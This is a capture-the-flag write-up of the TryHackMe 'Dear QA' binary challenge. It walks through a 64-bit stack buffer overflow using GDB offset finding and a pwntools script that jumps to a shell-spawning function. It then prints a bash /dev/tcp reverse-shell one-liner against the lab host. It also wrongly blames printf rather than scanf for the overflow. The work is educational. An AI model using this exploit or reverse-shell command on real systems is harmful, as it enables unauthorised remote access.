# Dear QA

## Background

> Are you able to solve this challenge involving reverse engineering and exploit development?

> Difficulty: Easy

- Overall difficulty for me: Easy
    - Initial foothold: Easy
    - Privilege escalation: N/A

# Enumeration

In this room, it gives me a binary to let me analyze it offline:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Dear_QA]
└─# file DearQA.DearQA 
DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Dear_QA]
└─# checksec DearQA.DearQA   
[*] '/root/ctf/thm/ctf/Dear_QA/DearQA.DearQA'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

As we can see, the binary is 64 bit, **not stripped**, which means we can reverse engineering it. Also the binary doesn't have any memory protection, which is great for us!

To do reverse engineering the binary, I'll use `cutter`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Dear_QA]
└─# /opt/Cutter-v2.0.5-x64.Linux.AppImage DearQA.DearQA
```

We can first check the `main()` function:

```c
#include <stdint.h>
 
int32_t main (void) {
    const char * var_20h;
    puts ("Welcome dearQA");
    puts ("I am sysadmin, i am new in developing");
    eax = 0;
    printf ("What's your name: ");
    rax = *(stdout);
    rdi = *(stdout);
    fflush ();
    rax = &var_20h;
    rsi = rax;
    edi = 0x400851;
    eax = 0;
    isoc99_scanf ();
    rax = &var_20h;
    rsi = rax;
    eax = 0;
    printf ("Hello: %s\n");
    eax = 0;
    return rax;
}
```

**Function `vuln()`:**
```c
#include <stdint.h>
 
int64_t vuln (void) {
    puts ("Congratulations!");
    puts ("You have entered in the secret function!");
    rax = *(stdout);
    rdi = *(stdout);
    fflush ();
    edx = 0;
    esi = 0;
    edi = "/bin/bash";
    execve ();
    return rax;
}
```

**Let's test for a segmentation fault:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Dear_QA]
└─# ./DearQA.DearQA                     
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./DearQA.DearQA
```

In the `main()` function, **the `printf ("Hello: %s\n");` is vulnerable to buffer overflow.**

Also, **there is a function called `vuln()`, which spawns a bash shell.**

So, **what if we can control the RSP, and jump to function `vuln()` to spawn a bash shell?**

To do so. I'll:

- Find the RSP offset:

I'll use `GDB` to create pattern and find the offset:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Dear_QA]
└─# gdb DearQA.DearQA
[...]
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'

gef➤  r
Starting program: /root/ctf/thm/ctf/Dear_QA/DearQA.DearQA 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Hello: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x000000000040072f in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffde18  →  "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x000000006012a0  →  "Hello: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaa[...]"
$rdi   : 0x007fffffffd890  →  0x007ffff7c596f0  →  <funlockfile+0> mov rdi, QWORD PTR [rdi+0x88]
$rip   : 0x0000000040072f  →  <main+108> ret 
$r8    : 0x0               
$r9    : 0x007ffff7daa4e0  →  0x0000000000000000
$r10   : 0x007ffff7daa3e0  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x007fffffffdf28  →  0x007fffffffe280  →  "/root/ctf/thm/ctf/Dear_QA/DearQA.DearQA"
$r13   : 0x000000004006c3  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe240  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde18│+0x0000: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"  ← $rsp
0x007fffffffde20│+0x0008: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x007fffffffde28│+0x0010: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"
0x007fffffffde30│+0x0018: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"
0x007fffffffde38│+0x0020: "jaaaaaaakaaaaaaalaaaaaaamaaa"
0x007fffffffde40│+0x0028: "kaaaaaaalaaaaaaamaaa"
0x007fffffffde48│+0x0030: "laaaaaaamaaa"
0x007fffffffde50│+0x0038: 0x007f006161616d ("maaa"?)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400724 <main+97>        call   0x400530 <printf@plt>
     0x400729 <main+102>       mov    eax, 0x0
     0x40072e <main+107>       leave  
 →   0x40072f <main+108>       ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "DearQA.DearQA", stopped 0x40072f in main (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40072f → main()
```

We hit a segmentation fault again, let's find the RSP offset.

```
gef➤  pattern offset 0x007fffffffde18
[+] Searching for '0x007fffffffde18'
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search) 
```

As we can see, **the binary crashed after 40 characters of our input, and we sucessfully overwrite the RSP value.**

**To confirm we can control the RSP, I'll add 40 A's and 8 B's.**
```
gef➤  r
Starting program: /root/ctf/thm/ctf/Dear_QA/DearQA.DearQA 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x000000000040072f in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffde18  →  "BBBBBBBB"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x000000006012a0  →  "Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB[...]"
$rdi   : 0x007fffffffd890  →  0x007ffff7c596f0  →  <funlockfile+0> mov rdi, QWORD PTR [rdi+0x88]
$rip   : 0x0000000040072f  →  <main+108> ret 
$r8    : 0x0               
$r9    : 0x007ffff7daa4e0  →  0x0000000000000000
$r10   : 0x007ffff7daa3e0  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x007fffffffdf28  →  0x007fffffffe280  →  "/root/ctf/thm/ctf/Dear_QA/DearQA.DearQA"
$r13   : 0x000000004006c3  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe240  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde18│+0x0000: "BBBBBBBB"     ← $rsp
0x007fffffffde20│+0x0008: 0x0000000000000000
0x007fffffffde28│+0x0010: 0x000000004006c3  →  <main+0> push rbp
0x007fffffffde30│+0x0018: 0x0000000100000000
0x007fffffffde38│+0x0020: 0x007fffffffdf28  →  0x007fffffffe280  →  "/root/ctf/thm/ctf/Dear_QA/DearQA.DearQA"
0x007fffffffde40│+0x0028: 0x0000000000000000
0x007fffffffde48│+0x0030: 0xce77702ceab3ec89
0x007fffffffde50│+0x0038: 0x007fffffffdf28  →  0x007fffffffe280  →  "/root/ctf/thm/ctf/Dear_QA/DearQA.DearQA"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400724 <main+97>        call   0x400530 <printf@plt>
     0x400729 <main+102>       mov    eax, 0x0
     0x40072e <main+107>       leave  
 →   0x40072f <main+108>       ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "DearQA.DearQA", stopped 0x40072f in main (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40072f → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```
$rsp   : 0x007fffffffde18  →  "BBBBBBBB"
```

As you can see, **the RSP has been overwritten by 8 B's.**

If we **put a valid memory address on RSP instead of 8 B's**, we can let the program to jump to that memory address, and continue the execution of the program.

Well, which memory address we should jump? Previously, we found a function called `vuln()`, which spawns a bash shell. Let's jump to that function!

> Note: Since the ASLR is disabled, the binary contains the exact same memory addresses each time the binary runs.

- Find function `vuln()` memory address:

We can do this in `GDB`!

```
gef➤  info function vuln
All functions matching regular expression "vuln":

Non-debugging symbols:
0x0000000000400686  vuln
```

- Function `vuln()` memory address: `0x0000000000400686`

# Exploit Development

Armed with the above information, we found:

- Where the binary causes segmentation fault
- Found RSP offset: 40
- Found function `vuln()` memory address: `0x0000000000400686`

Now, we can write a simple python script to exploit it:

> Note: **It's a good practice to test buffer overflow locally first.**

**Local debug:**
```py
#!/bin/usr/env python3

from pwn import *

Local = True

if Local == True:
    io = process("./DearQA.DearQA")
else:
    io = remote("10.10.16.159", 5700)

payload = b"A" * 40
payload += p64(0x0000000000400686)

io.recvuntil(b"What's your name:")
io.sendline(payload)
io.interactive()
```

**Run it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Dear_QA]
└─# python3 exploit.py
[+] Starting local process './DearQA.DearQA': pid 55326
[*] Switching to interactive mode
 Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x06
Congratulations!
You have entered in the secret function!
$ whoami;id
root
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),119(wireshark),142(kaboxer)
```

We successfully exploited it locally! **Next, let's exploit it remotely!**

**Set the `Local` variable to `False`:**
```py
Local = False
```

**Run it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Dear_QA]
└─# python3 exploit.py
[+] Opening connection to 10.10.16.159 on port 5700: Done
[*] Switching to interactive mode






ctf@dearqa:/home/ctf$ $ whoami


ctf@dearqa:/home/ctf$ $ id


ctf@dearqa:/home/ctf$ $ 
```

We have a shell in the target machine!! BUT, looks like there is no output for me. Let's test the target machine can reach out to me or not.

```
ctf@dearqa:/home/ctf$ $ ping -c 4 10.18.61.134

┌──(root🌸siunam)-[~/ctf/thm/ctf/Dear_QA]
└─# tcpdump -i tun0 icmp     
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:23:08.079020 IP 10.10.16.159 > 10.18.61.134: ICMP echo request, id 1255, seq 1, length 64
01:23:08.079206 IP 10.18.61.134 > 10.10.16.159: ICMP echo reply, id 1255, seq 1, length 64
01:23:09.080963 IP 10.10.16.159 > 10.18.61.134: ICMP echo request, id 1255, seq 2, length 64
01:23:09.080996 IP 10.18.61.134 > 10.10.16.159: ICMP echo reply, id 1255, seq 2, length 64
01:23:10.081941 IP 10.10.16.159 > 10.18.61.134: ICMP echo request, id 1255, seq 3, length 64
01:23:10.081968 IP 10.18.61.134 > 10.10.16.159: ICMP echo reply, id 1255, seq 3, length 64
01:23:11.082613 IP 10.10.16.159 > 10.18.61.134: ICMP echo request, id 1255, seq 4, length 64
01:23:11.082626 IP 10.18.61.134 > 10.10.16.159: ICMP echo reply, id 1255, seq 4, length 64
```

Yep, the target machine can reach out to me. **Let's get a reverse shell then!**

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Dear_QA]
└─# nc -lnvp 443   
listening on [any] 443 ...
```

- Send a bash reverse shell:

```
ctf@dearqa:/home/ctf$ $ /bin/bash -i >& /dev/tcp/10.18.61.134/443 0>&1
```

```
[...]
connect to [10.18.61.134] from (UNKNOWN) [10.10.16.159] 45074
bash: cannot set terminal process group (444): Inappropriate ioctl for device
bash: no job control in this shell
ctf@dearqa:/home/ctf$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
ctf
dearqa
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:98:78:d9:a6:87 brd ff:ff:ff:ff:ff:ff
    inet 10.10.16.159/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::98:78ff:fed9:a687/64 scope link 
       valid_lft forever preferred_lft forever
ctf@dearqa:/home/ctf$ 
```

Yes!!! We have output now! Let's get the flag!

**flag.txt:**
```
ctf@dearqa:/home/ctf$ cat /home/ctf/flag.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Reverse Engineering
2. Linux 64-Bit Binary Buffer Overflow